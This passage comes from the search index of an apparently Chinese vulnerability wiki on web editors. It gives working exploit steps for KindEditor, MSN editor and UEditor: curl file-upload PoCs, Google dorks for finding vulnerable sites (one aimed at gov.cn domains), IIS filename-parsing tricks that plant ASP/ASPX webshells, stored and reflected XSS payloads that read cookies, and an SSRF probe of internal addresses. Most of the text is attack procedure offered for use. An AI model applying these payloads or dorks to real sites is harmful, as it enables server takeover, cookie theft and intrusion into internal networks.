3.2.1\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%203.2.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#kindeditor","text":"","title":"Kindeditor"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%203.2.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#win-2003-iisshell","text":"\u5f71\u54cd\u7248\u672c: <= kindeditor 3.2.1(09\u5e748\u6708\u4efd\u53d1\u5e03\u7684\u6700\u65b0\u7248) \u8106\u5f31\u63cf\u8ff0/\u653b\u51fb\u5229\u7528\uff1a test.asp;.jpg","title":"\u5229\u7528WIN 2003 IIS\u6587\u4ef6\u540d\u79f0\u89e3\u6790\u6f0f\u6d1e\u83b7\u5f97SHELL"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%203.5.2-4.1%E4%B8%8A%E4%BC%A0%E4%BF%AE%E6%94%B9%E6%8B%BFshell/","text":"**\u4e0a\u4f20\u4fee\u6539\u62ffshell\u6f0f\u6d1e **\u5f71\u54cd\u7248\u672c\uff1a KindEditor 3.5.2~4.1 \u6f0f\u6d1e\u5229\u7528\uff1a \u6253\u5f00\u7f16\u8f91\u5668\uff0c\u5c06\u4e00\u53e5\u8bdd\u6539\u540d\u4e3a1.jpg \u4e0a\u4f20\u56fe\u7247\uff0c \u6253\u5f00\u6587\u4ef6\u7ba1\u7406\uff0c\u8fdb\u5165\u201cdown\u201d\u76ee\u5f55\uff0c\u8df3\u81f3\u5c3e\u9875\uff0c\u6700\u540e\u4e00\u4e2a\u56fe\u7247\u65e2\u662f\u6211\u4eec\u4e0a\u4f20\u7684\u4e00\u53e5\u8bdd \u70b9\u51fb\u6539\u540d \u6253\u5f00\u8c37\u6b4c\u6d4f\u89c8\u5668\u7684 \u5ba1\u67e5\u5143\u7d20 \u627e\u5230form\u8868\u5355 \u4fee\u6539\u201cjpg\u201d\u4e3a\u201casp\u201d \u540d\u5b57\u4fee\u6539\u4e3a1 \u4fdd\u5b58 \u4e00\u53e5\u8bdd\u5c31\u751f\u6210\u4e86\uff0c\u8fde\u63a5\u5730\u5740\u4e3a http://www .*.com /upfiles/down/1.asp","title":"Kindeditor 3.5.2 4.1\u4e0a\u4f20\u4fee\u6539\u62ffshell"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.11%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 kindeditor <= 4.1.11 \u6f0f\u6d1ePOC \u00b6 curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/php/upload_json.php?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/asp/upload_json.asp?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/jsp/upload_json.jsp?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/aspx/upload_json.aspx?dir=file \u200b```\u8fd4\u56de\u503c\u4e3a\u8def\u5f84","title":"kindeditor\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.11%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_1","text":"kindeditor <= 4.1.11","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.11%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#poc","text":"curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/php/upload_json.php?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/asp/upload_json.asp?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/jsp/upload_json.jsp?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/aspx/upload_json.aspx?dir=file \u200b```\u8fd4\u56de\u503c\u4e3a\u8def\u5f84","title":"\u6f0f\u6d1ePOC"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"kindeditor<=4.1.5\u4e0a\u4f20\u6f0f\u6d1e \u00b6 0x00 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6f0f\u6d1e\u5b58\u5728\u4e8ekindeditor\u7f16\u8f91\u5668\u91cc\uff0c\u4f60\u80fd\u4e0a\u4f20.txt\u548c.html\u6587\u4ef6\uff0c\u652f\u6301php/asp/jsp/asp.net,\u6f0f\u6d1e\u5b58\u5728\u4e8e\u5c0f\u4e8e\u7b49\u4e8ekindeditor4.1.5\u7f16\u8f91\u5668\u4e2d \u8fd9\u91cchtml\u91cc\u9762\u53ef\u4ee5\u5d4c\u5957\u6697\u94fe\u63a5\u5730\u5740\u4ee5\u53ca\u5d4c\u5957xss\u3002Kindeditor\u4e0a\u7684uploadbutton.html\u7528\u4e8e\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u9875\u9762\uff0c\u76f4\u63a5POST\u5230/upload_json.*?dir=file\uff0c\u5728\u5141\u8bb8\u4e0a\u4f20\u7684\u6587\u4ef6\u6269\u5c55\u540d\u4e2d\u5305\u542bhtm,txt\uff1aextTable.Add(\"file\",\"doc,docx,xls,xlsx,ppt,htm,html,txt,zip,rar,gz,bz2\") 0x01 \u6279\u91cf\u641c\u7d22 \u00b6 \u5728google\u4e2d\u6279\u91cf\u641c\u7d22\uff1a inurl:/examples/uploadbutton.html inurl:/php/upload_json.php inurl:/asp.net/upload_json.ashx inurl://jsp/upload_json.jsp inurl://asp/upload_json.asp inurl:gov.cn/kindeditor/ 0x02 \u6f0f\u6d1e\u95ee\u9898 \u00b6 \u6839\u672c\u811a\u672c\u8bed\u8a00\u81ea\u5b9a\u4e49\u4e0d\u540c\u7684\u4e0a\u4f20\u5730\u5740\uff0c\u4e0a\u4f20\u4e4b\u524d\u6709\u5fc5\u8981\u9a8c\u8bc1\u6587\u4ef6 upload_json.* \u7684\u5b58\u5728 /asp/upload_json.asp /asp.net/upload_json.ashx /jsp/upload_json.jsp /php/upload_json.php \u53ef\u76ee\u5f55\u53d8\u91cf\u67e5\u770b\u662f\u5426\u5b58\u5728\u90a3\u79cd\u811a\u672c\u4e0a\u4f20\u6f0f\u6d1e: kindeditor/asp/upload_json.asp?dir=file kindeditor/asp.net/upload_json.ashx?dir=file kindeditor/jsp/upload_json.jsp?dir=file kindeditor/php/upload_json.php?dir=file 0x03 \u6f0f\u6d1e\u5229\u7528 \u00b6 google\u641c\u7d20\u4e00\u4e9b\u5b58\u5728\u7684\u7ad9\u70b9 inurl\uff1akindeditor 1.\u67e5\u770b\u7248\u672c\u4fe1\u606f http://www.xxx.org/kindeditor//kindeditor.js 2.\u7248\u672c\u662f4.1.10\u53ef\u4ee5\u8fdb\u884c\u5c1d\u8bd5\u5982\u4e0b\u8def\u5f84\u662f\u5426\u5b58\u5728\u6709\u5fc5\u8981\u9a8c\u8bc1\u6587\u4ef6 upload_json.* kindeditor/asp/upload_json.asp?dir=file kindeditor/asp.net/upload_json.ashx?dir=file kindeditor/jsp/upload_json.jsp?dir=file kindeditor/php/upload_json.php?dir=file 3.\u5982\u4e0b\u56fe\u53ef\u4ee5\u770b\u51fa\u662f\u5b58\u5728jsp\u4e0a\u4f20\u70b9: http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file 4.\u5199\u51fa\u4e0b\u9762\u7684\u6784\u9020\u4e0a\u4f20poc,\u8fd9\u91cc\u9700\u8981\u4fee\u6539","title":"kindeditor<=4.1.5\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#kindeditor415","text":"","title":"kindeditor&lt;=4.1.5\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#0x00","text":"\u6f0f\u6d1e\u5b58\u5728\u4e8ekindeditor\u7f16\u8f91\u5668\u91cc\uff0c\u4f60\u80fd\u4e0a\u4f20.txt\u548c.html\u6587\u4ef6\uff0c\u652f\u6301php/asp/jsp/asp.net,\u6f0f\u6d1e\u5b58\u5728\u4e8e\u5c0f\u4e8e\u7b49\u4e8ekindeditor4.1.5\u7f16\u8f91\u5668\u4e2d \u8fd9\u91cchtml\u91cc\u9762\u53ef\u4ee5\u5d4c\u5957\u6697\u94fe\u63a5\u5730\u5740\u4ee5\u53ca\u5d4c\u5957xss\u3002Kindeditor\u4e0a\u7684uploadbutton.html\u7528\u4e8e\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u9875\u9762\uff0c\u76f4\u63a5POST\u5230/upload_json.*?dir=file\uff0c\u5728\u5141\u8bb8\u4e0a\u4f20\u7684\u6587\u4ef6\u6269\u5c55\u540d\u4e2d\u5305\u542bhtm,txt\uff1aextTable.Add(\"file\",\"doc,docx,xls,xlsx,ppt,htm,html,txt,zip,rar,gz,bz2\")","title":"0x00 \u6f0f\u6d1e\u63cf\u8ff0"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#0x01","text":"\u5728google\u4e2d\u6279\u91cf\u641c\u7d22\uff1a inurl:/examples/uploadbutton.html inurl:/php/upload_json.php inurl:/asp.net/upload_json.ashx inurl://jsp/upload_json.jsp inurl://asp/upload_json.asp inurl:gov.cn/kindeditor/","title":"0x01 \u6279\u91cf\u641c\u7d22"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#0x02","text":"\u6839\u672c\u811a\u672c\u8bed\u8a00\u81ea\u5b9a\u4e49\u4e0d\u540c\u7684\u4e0a\u4f20\u5730\u5740\uff0c\u4e0a\u4f20\u4e4b\u524d\u6709\u5fc5\u8981\u9a8c\u8bc1\u6587\u4ef6 upload_json.* \u7684\u5b58\u5728 /asp/upload_json.asp /asp.net/upload_json.ashx /jsp/upload_json.jsp /php/upload_json.php \u53ef\u76ee\u5f55\u53d8\u91cf\u67e5\u770b\u662f\u5426\u5b58\u5728\u90a3\u79cd\u811a\u672c\u4e0a\u4f20\u6f0f\u6d1e: kindeditor/asp/upload_json.asp?dir=file kindeditor/asp.net/upload_json.ashx?dir=file kindeditor/jsp/upload_json.jsp?dir=file kindeditor/php/upload_json.php?dir=file","title":"0x02 \u6f0f\u6d1e\u95ee\u9898"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%204.1.5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#0x03","text":"google\u641c\u7d20\u4e00\u4e9b\u5b58\u5728\u7684\u7ad9\u70b9 inurl\uff1akindeditor 1.\u67e5\u770b\u7248\u672c\u4fe1\u606f http://www.xxx.org/kindeditor//kindeditor.js 2.\u7248\u672c\u662f4.1.10\u53ef\u4ee5\u8fdb\u884c\u5c1d\u8bd5\u5982\u4e0b\u8def\u5f84\u662f\u5426\u5b58\u5728\u6709\u5fc5\u8981\u9a8c\u8bc1\u6587\u4ef6 upload_json.* kindeditor/asp/upload_json.asp?dir=file kindeditor/asp.net/upload_json.ashx?dir=file kindeditor/jsp/upload_json.jsp?dir=file kindeditor/php/upload_json.php?dir=file 3.\u5982\u4e0b\u56fe\u53ef\u4ee5\u770b\u51fa\u662f\u5b58\u5728jsp\u4e0a\u4f20\u70b9: http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file 4.\u5199\u51fa\u4e0b\u9762\u7684\u6784\u9020\u4e0a\u4f20poc,\u8fd9\u91cc\u9700\u8981\u4fee\u6539","title":"0x03 \u6f0f\u6d1e\u5229\u7528"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0/","text":"**KindEditor\u4e0a\u4f20\u89e3\u6790\u6f0f\u6d1e **\u5f71\u54cd\u7248\u672c\uff1a<= kindeditor 3.2.1(09\u5e748\u6708\u4efd\u53d1\u5e03\u7684\u6700\u65b0\u7248) \u6f0f\u6d1e\u5229\u7528\uff1a\u5229\u7528windows 2003 IIS\u89e3\u6790\u6f0f\u6d1e\u62ffWEBSHELL","title":"Kindeditor \u89e3\u6790\u6f0f\u6d1e\u4e0a\u4f20"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/MSNeditor/MSN%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"Msn editor \u00b6 \u5229\u7528WIN 2003 IIS\u6587\u4ef6\u540d\u79f0\u89e3\u6790\u6f0f\u6d1e\u83b7\u5f97SHELL \u00b6 \u5f71\u54cd\u7248\u672c\uff1a\u672a\u77e5 \u8106\u5f31\u63cf\u8ff0\uff1a \u70b9\u51fb\u56fe\u7247\u4e0a\u4f20\u540e\u4f1a\u51fa\u73b0\u4e0a\u4f20\u9875\u9762\uff0c\u5730\u5740\u4e3a http://navisec.it/admin/uploadPic.asp?language=&editImageNum=0&editRemNum= \u7528\u666e\u901a\u7684\u56fe\u7247\u4e0a\u4f20\u540e\uff0c\u5730\u5740\u4e3a http://navisec.it/news/uppic/41513102009204012_1.gif \u8bb0\u4f4f\u8fd9\u65f6\u5019\u7684\u8def\u5f84\uff0c\u518d\u70b9\u51fb\u56fe\u7247\u7684\u4e0a\u4f20\uff0c\u8fd9\u65f6\u5019\u5730\u5740\u5c31\u53d8\u6210\u4e86 http://navisec.it/news/admin/uploadPic.asp?language=&editImageNum=1&editRemNum=41513102009204012 \u5f88\u660e\u663e\u3002\u56fe\u7247\u7684\u5730\u5740\u662f\u6839\u636eRemNum\u540e\u9762\u7684\u7f16\u53f7\u751f\u6210\u7684\u3002 \u653b\u51fb\u5229\u7528: \u914d\u5408IIS\u7684\u89e3\u6790\u6f0f\u6d1e\uff0c\u628aRemNum\u540e\u9762\u7684\u6570\u636e\u4fee\u6539\u4e3a1.asp;41513102009204012\uff0c\u53d8\u6210\u4e0b\u9762\u8fd9\u4e2a\u5730\u5740 http://navisec.it/admin/uploadPic.asp?language=&editImageNum=0&editRemNum=1.asp;41513102009204012 \u7136\u540e\u5728\u6d4f\u89c8\u5668\u91cc\u6253\u5f00\uff0c\u7136\u540e\u9009\u62e9\u4f60\u7684\u811a\u672c\u6728\u9a6c\u4e0a\u4f20\uff0c\u5c06\u4f1a\u8fd4\u56de\u4e0b\u9762\u7684\u5730\u5740 uppic/1.asp;41513102009204012_2.gif \u76f4\u63a5\u6253\u5f00\u5c31\u662f\u6211\u4eec\u7684\u5c0f\u9a6c\u5730\u5740\uff01","title":"MSN\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/MSNeditor/MSN%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#msn-editor","text":"","title":"Msn editor"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/MSNeditor/MSN%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#win-2003-iisshell","text":"\u5f71\u54cd\u7248\u672c\uff1a\u672a\u77e5 \u8106\u5f31\u63cf\u8ff0\uff1a \u70b9\u51fb\u56fe\u7247\u4e0a\u4f20\u540e\u4f1a\u51fa\u73b0\u4e0a\u4f20\u9875\u9762\uff0c\u5730\u5740\u4e3a http://navisec.it/admin/uploadPic.asp?language=&editImageNum=0&editRemNum= \u7528\u666e\u901a\u7684\u56fe\u7247\u4e0a\u4f20\u540e\uff0c\u5730\u5740\u4e3a http://navisec.it/news/uppic/41513102009204012_1.gif \u8bb0\u4f4f\u8fd9\u65f6\u5019\u7684\u8def\u5f84\uff0c\u518d\u70b9\u51fb\u56fe\u7247\u7684\u4e0a\u4f20\uff0c\u8fd9\u65f6\u5019\u5730\u5740\u5c31\u53d8\u6210\u4e86 http://navisec.it/news/admin/uploadPic.asp?language=&editImageNum=1&editRemNum=41513102009204012 \u5f88\u660e\u663e\u3002\u56fe\u7247\u7684\u5730\u5740\u662f\u6839\u636eRemNum\u540e\u9762\u7684\u7f16\u53f7\u751f\u6210\u7684\u3002 \u653b\u51fb\u5229\u7528: \u914d\u5408IIS\u7684\u89e3\u6790\u6f0f\u6d1e\uff0c\u628aRemNum\u540e\u9762\u7684\u6570\u636e\u4fee\u6539\u4e3a1.asp;41513102009204012\uff0c\u53d8\u6210\u4e0b\u9762\u8fd9\u4e2a\u5730\u5740 http://navisec.it/admin/uploadPic.asp?language=&editImageNum=0&editRemNum=1.asp;41513102009204012 \u7136\u540e\u5728\u6d4f\u89c8\u5668\u91cc\u6253\u5f00\uff0c\u7136\u540e\u9009\u62e9\u4f60\u7684\u811a\u672c\u6728\u9a6c\u4e0a\u4f20\uff0c\u5c06\u4f1a\u8fd4\u56de\u4e0b\u9762\u7684\u5730\u5740 uppic/1.asp;41513102009204012_2.gif \u76f4\u63a5\u6253\u5f00\u5c31\u662f\u6211\u4eec\u7684\u5c0f\u9a6c\u5730\u5740\uff01","title":"\u5229\u7528WIN 2003 IIS\u6587\u4ef6\u540d\u79f0\u89e3\u6790\u6f0f\u6d1e\u83b7\u5f97SHELL"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%20%E5%8F%8D%E5%B0%84xss%E6%BC%8F%E6%B4%9E/","text":"Ueditor \u53cd\u5c04\u578bxss\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u5730\u5740\uff1a \u00b6 /php/getContent.php /asp/getContent.asp /jsp/getContent.jsp /net/getContent.ashx \u6f0f\u6d1ePOC \u00b6 POST: myEditor=<script>alert(document.cookie)</script>","title":"Ueditor \u53cd\u5c04\u578bxss\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%20%E5%8F%8D%E5%B0%84xss%E6%BC%8F%E6%B4%9E/#ueditor-xss","text":"","title":"Ueditor \u53cd\u5c04\u578bxss\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%20%E5%8F%8D%E5%B0%84xss%E6%BC%8F%E6%B4%9E/#_1","text":"/php/getContent.php /asp/getContent.asp /jsp/getContent.jsp /net/getContent.ashx","title":"\u6f0f\u6d1e\u5730\u5740\uff1a"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%20%E5%8F%8D%E5%B0%84xss%E6%BC%8F%E6%B4%9E/#poc","text":"POST: myEditor=<script>alert(document.cookie)</script>","title":"\u6f0f\u6d1ePOC"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%20%E5%AD%98%E5%82%A8xss%E6%BC%8F%E6%B4%9E/","text":"Ueditor xss\u5b58\u50a8\u6f0f\u6d1e \u00b6 \u76f4\u63a5\u6587\u672c\u6846\u8f93\u5165 \u6f0f\u6d1ePOC: <html> <head></head> <body> <something:script xmlns:something= \"http://www.w3.org/1999/xhtml\" > alert(1) </something:script> </body> </html> \u76f2\u6253Cookie\u3001src=\"\"\uff1a <something:script src= \"\" xmlns:something= \"http://www.w3.org/1999/xhtml\" ></something:script> Ueditor \u9ed8\u8ba4\u652f\u6301\u4e0a\u4f20 xml \uff1aconfig.json\u53ef\u4ee5\u67e5\u770b\u652f\u6301\u4e0a\u4f20\u7684\u540e\u7f00 /ueditor/asp/config.json /ueditor/net/config.json /ueditor/php/config.json /ueditor/jsp/config.json \u4e0a\u4f20\u6587\u4ef6\u8def\u5f84 /ueditor/index.html /ueditor/asp/controller.asp?action=uploadimage /ueditor/asp/controller.asp?action=uploadfile /ueditor/net/controller.ashx?action=uploadimage /ueditor/net/controller.ashx?action=uploadfile /ueditor/php/controller.php?action=uploadfile /ueditor/php/controller.php?action=uploadimage /ueditor/jsp/controller.jsp?action=uploadfile /ueditor/jsp/controller.jsp?action=uploadimag","title":"Ueditor xss\u5b58\u50a8\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%20%E5%AD%98%E5%82%A8xss%E6%BC%8F%E6%B4%9E/#ueditor-xss","text":"\u76f4\u63a5\u6587\u672c\u6846\u8f93\u5165 \u6f0f\u6d1ePOC: <html> <head></head> <body> <something:script xmlns:something= \"http://www.w3.org/1999/xhtml\" > alert(1) </something:script> </body> </html> \u76f2\u6253Cookie\u3001src=\"\"\uff1a <something:script src= \"\" xmlns:something= \"http://www.w3.org/1999/xhtml\" ></something:script> Ueditor \u9ed8\u8ba4\u652f\u6301\u4e0a\u4f20 xml \uff1aconfig.json\u53ef\u4ee5\u67e5\u770b\u652f\u6301\u4e0a\u4f20\u7684\u540e\u7f00 /ueditor/asp/config.json /ueditor/net/config.json /ueditor/php/config.json /ueditor/jsp/config.json \u4e0a\u4f20\u6587\u4ef6\u8def\u5f84 /ueditor/index.html /ueditor/asp/controller.asp?action=uploadimage /ueditor/asp/controller.asp?action=uploadfile /ueditor/net/controller.ashx?action=uploadimage /ueditor/net/controller.ashx?action=uploadfile /ueditor/php/controller.php?action=uploadfile /ueditor/php/controller.php?action=uploadimage /ueditor/jsp/controller.jsp?action=uploadfile /ueditor/jsp/controller.jsp?action=uploadimag","title":"Ueditor xss\u5b58\u50a8\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A8.NET1.4.3.3%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"Ueditor\u7f16\u8f91\u5668.NET1.4.3.3\u7248\u672c\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u5f71\u54cd\uff1a \u00b6 .NET 1.4.3.3\u7248\u672c \u6f0f\u6d1ePOC\uff1a \u00b6 < form action = \"www.XXXX.com.cn/controller.ashx?action=catchimage\" enctype = \"application/x-www-form-urlencoded\" method = \"POST\" > < p > shell addr: < input type = \"text\" name = \"source[]\" /></ p > < input type = \"submit\" value = \"submit\" /> </ form > \u4fdd\u5b58\u4e3ahtml\u6587\u4ef6\uff0c\u6253\u5f00\u540e\u4e0a\u4f20\u6846\u8f93\u5165\u8fdc\u7a0b\u56fe\u7247\u9a6ctest.jpg\uff0c\u4e0a\u4f20\u65f6\u8def\u5f84\u6700\u540e\u6539\u4e3atest.jpg?.aspx \u8fd4\u56deshell\u8def\u5f84\u83dc\u5200\u8fde\u63a5\u5373\u53ef\uff01","title":"Ueditor\u7f16\u8f91\u5668.NET1.4.3.3\u7248\u672c\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A8.NET1.4.3.3%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#ueditornet1433","text":"","title":"Ueditor\u7f16\u8f91\u5668.NET1.4.3.3\u7248\u672c\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A8.NET1.4.3.3%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_1","text":".NET 1.4.3.3\u7248\u672c","title":"\u6f0f\u6d1e\u5f71\u54cd\uff1a"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A8.NET1.4.3.3%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#poc","text":"< form action = \"www.XXXX.com.cn/controller.ashx?action=catchimage\" enctype = \"application/x-www-form-urlencoded\" method = \"POST\" > < p > shell addr: < input type = \"text\" name = \"source[]\" /></ p > < input type = \"submit\" value = \"submit\" /> </ form > \u4fdd\u5b58\u4e3ahtml\u6587\u4ef6\uff0c\u6253\u5f00\u540e\u4e0a\u4f20\u6846\u8f93\u5165\u8fdc\u7a0b\u56fe\u7247\u9a6ctest.jpg\uff0c\u4e0a\u4f20\u65f6\u8def\u5f84\u6700\u540e\u6539\u4e3atest.jpg?.aspx \u8fd4\u56deshell\u8def\u5f84\u83dc\u5200\u8fde\u63a5\u5373\u53ef\uff01","title":"\u6f0f\u6d1ePOC\uff1a"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A81.4.3.3%E7%89%88%E6%9C%ACssrf%E6%BC%8F%E6%B4%9E/","text":"Ueditor ssrf\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u5f71\u54cd\uff1a \u00b6 v1.4.3 \u6f0f\u6d1ePOC \u00b6 \u5b58\u5728\u6f0f\u6d1e\u8def\u5f84\uff1a http://localhost:8088/jsp/controller.jsp?action=catchimage&source[]=http://192.168.135.133:8080/test.jpg \u53ef\u6839\u636e\u9875\u9762\u8fd4\u56de\u7684\u7ed3\u679c\u4e0d\u540c\u5224\u65ad\u8be5\u5730\u5740\u7aef\u53e3\u662f\u5426\u5f00\u653e\uff1a \u5982\u679c\u6293\u53d6\u4e0d\u5b58\u5728\u7684\u56fe\u7247\u5730\u5740\u65f6\uff0c\u9875\u9762\u8fd4\u56de{\"state\": \"SUCCESS\", list: [{\"state\":\"\\u8fdc\\u7a0b\\u8fde\\u63a5\\u51fa\\u9519\"} ]}\uff0c\u5373state\u4e3a\u201c\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519\u201d\u3002 \u5982\u679c\u6210\u529f\u6293\u53d6\u5230\u56fe\u7247\uff0c\u9875\u9762\u8fd4\u56de{\"state\": \"SUCCESS\", list: [{\"state\": \"SUCCESS\",\"size\":\"5103\",\"source\":\" http://192.168.135.133:8080/tomcat.png\",\"title\":\"1527173588127099881.png\",\"url\":\"/ueditor/jsp/upload/image/20180524/1527173588127099881.png \"} ]}\uff0c\u5373state\u4e3a\u201cSUCCESS\u201d\u3002 \u5982\u679c\u4e3b\u673a\u65e0\u6cd5\u8bbf\u95ee\uff0c\u9875\u9762\u8fd4\u56de{\"state\":\"SUCCESS\", list: [{\"state\": \"\\u6293\\u53d6\\u8fdc\\u7a0b\\u56fe\\u7247\\u5931\\u8d25\"}]}\uff0c\u5373state\u4e3a\u201c\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25\u201d\u3002 \u7531\u4e8e\u9664\u4e86\u5728config.js\u4e2d\u7684catcherLocalDomain\u914d\u7f6e\u4e86\u8fc7\u6ee4\u7684\u5730\u5740\u5916\uff0c\u6ca1\u6709\u9488\u5bf9\u5185\u90e8\u5730\u5740\u8fdb\u884c\u8fc7\u6ee4\uff0c\u6240\u4ee5\u53ef\u4ee5\u6839\u636e\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u8fd4\u56de\u7ed3\u679c\u7684\u4e0d\u540c\uff0c\u6765\u8fdb\u884c\u5185\u7f51\u7684\u63a2\u6d4b\u3002","title":"Ueditor 